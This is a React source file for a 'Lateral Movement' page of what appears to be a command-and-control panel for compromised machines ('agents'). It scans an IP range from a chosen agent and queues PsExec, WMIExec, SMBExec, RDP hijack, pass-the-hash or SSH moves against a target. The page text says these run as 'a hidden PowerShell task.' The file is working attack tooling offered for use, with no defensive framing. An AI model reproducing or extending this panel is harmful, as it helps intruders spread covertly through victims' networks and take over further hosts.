import * as React from 'react'
import { GradientText } from '@/components/ui/GradientText'
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/Card'
import { Button } from '@/components/ui/Button'
import { Input } from '@/components/ui/Input'
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/Tabs'
import { useAgentStore } from '@/stores/agentStore'
import { useUIStore } from '@/stores/uiStore'
import { api } from '@/services/api'
import { toast } from 'sonner'
import { ArrowRightLeft, RefreshCw, Target } from 'lucide-react'

const techniques = [
  { id: 'psexec', name: 'PsExec', desc: 'SMB admin$ remote exec' },
  { id: 'wmiexec', name: 'WMIExec', desc: 'Win32_Process.Create' },
  { id: 'smbexec', name: 'SMBExec', desc: 'Service create via SMB' },
  { id: 'rdp', name: 'RDP Hijack', desc: 'Session inject' },
  { id: 'pth', name: 'Pass-the-Hash', desc: 'NTLM hash auth' },
  { id: 'ssh', name: 'SSH', desc: 'Key or password' },
]

export function LateralPage() {
  const { agents, fetchAgents, selectedAgent, setSelectedAgent, fetchTasks, tasks } = useAgentStore()
  const pushNotice = useUIStore(s => s.pushNotice)
  const [scanRange, setScanRange] = React.useState('192.168.1.0/24')
  const [target, setTarget] = React.useState('')
  const [technique, setTechnique] = React.useState('psexec')
  const [busy, setBusy] = React.useState(false)
  const [output, setOutput] = React.useState('')

  React.useEffect(() => { fetchAgents() }, [fetchAgents])
  React.useEffect(() => {
    if (!selectedAgent && agents[0]) setSelectedAgent(agents[0])
  }, [agents, selectedAgent, setSelectedAgent])
  React.useEffect(() => {
    if (selectedAgent) fetchTasks(selectedAgent.ID)
  }, [selectedAgent, fetchTasks])

  const agentId = selectedAgent?.ID || ''

  const scan = async () => {
    if (!agentId) { toast.error('pick an agent'); return }
    setBusy(true)
    try {
      const res: any = await api.scanNetwork(agentId, scanRange)
      setOutput(JSON.stringify(res, null, 2))
      toast.success('scan queued')
      pushNotice({ kind: 'info', title: 'Network scan', body: `${scanRange} on ${selectedAgent?.Hostname}` })
      await fetchTasks(agentId)
    } catch (e) {
      toast.error(e instanceof Error ? e.message : 'scan failed')
    } finally { setBusy(false) }
  }

  const exec = async () => {
    if (!agentId || !target) { toast.error('agent + target required'); return }
    setBusy(true)
    try {
      const res: any = await api.executeLateralMove(agentId, { technique, target })
      setOutput(JSON.stringify(res, null, 2))
      toast.success(`${technique} queued → ${target}`)
      pushNotice({ kind: 'success', title: 'Lateral queued', body: `${technique} → ${target}` })
      await fetchTasks(agentId)
    } catch (e) {
      toast.error(e instanceof Error ? e.message : 'exec failed')
    } finally { setBusy(false) }
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between gap-4">
        <div>
          <GradientText className="text-3xl font-bold" colors={['#fff', '#d946ef', '#a855f7']}>Lateral Movement</GradientText>
          <p className="text-dark-400 mt-1">Queues a hidden PowerShell task on the selected agent</p>
        </div>
        <select
          className="px-3 py-2 bg-dark-800 border border-dark-700 rounded-lg text-dark-100"
          value={agentId}
          onChange={e => setSelectedAgent(agents.find(a => a.ID === e.target.value) || null)}
        >
          <option value="">select agent</option>
          {agents.map(a => <option key={a.ID} value={a.ID}>{a.Hostname} ({a.Status})</option>)}
        </select>
      </div>

      <Tabs defaultValue="scan">
        <TabsList>
          <TabsTrigger value="scan">Scan</TabsTrigger>
          <TabsTrigger value="execute">Execute</TabsTrigger>
          <TabsTrigger value="results">Results ({tasks.length})</TabsTrigger>
        </TabsList>
        <TabsContent value="scan" className="space-y-3">
          <Card>
            <CardContent className="p-4 flex gap-3">
              <Input value={scanRange} onChange={e => setScanRange(e.target.value)} placeholder="CIDR" />
              <Button onClick={scan} disabled={busy || !agentId}><Target className="w-4 h-4 mr-2" />Scan</Button>
            </CardContent>
          </Card>
        </TabsContent>
        <TabsContent value="execute" className="space-y-3">
          <Card>
            <CardContent className="p-4 space-y-3">
              <Input value={target} onChange={e => setTarget(e.target.value)} placeholder="target IP / host" />
              <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
                {techniques.map(t => (
                  <button key={t.id} type="button" onClick={() => setTechnique(t.id)}
                    className={`text-left p-3 rounded-lg border ${technique === t.id ? 'border-accent-500 bg-accent-500/10' : 'border-dark-700'}`}>
                    <p className="font-medium text-dark-100">{t.name}</p>
                    <p className="text-xs text-dark-500">{t.desc}</p>
                  </button>
                ))}
              </div>
              <Button onClick={exec} disabled={busy || !agentId}>Queue {technique}</Button>
            </CardContent>
          </Card>
        </TabsContent>
        <TabsContent value="results">
          <Card>
            <CardHeader className="flex-row items-center justify-between">
              <CardTitle>Queued tasks</CardTitle>
              <Button variant="ghost" size="sm" onClick={() => agentId && fetchTasks(agentId)}><RefreshCw className="w-4 h-4" /></Button>
            </CardHeader>
            <CardContent className="space-y-2 font-mono text-xs">
              {tasks.length === 0 && <p className="text-dark-500">no tasks yet</p>}
              {tasks.map((t: any) => (
                <div key={t.id || t.ID} className="p-2 rounded border border-dark-700">
                  {(t.command || t.Command || '')} — {t.status || t.Status}
                </div>
              ))}
              {output && <pre className="whitespace-pre-wrap text-dark-400">{output}</pre>}
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  )
}
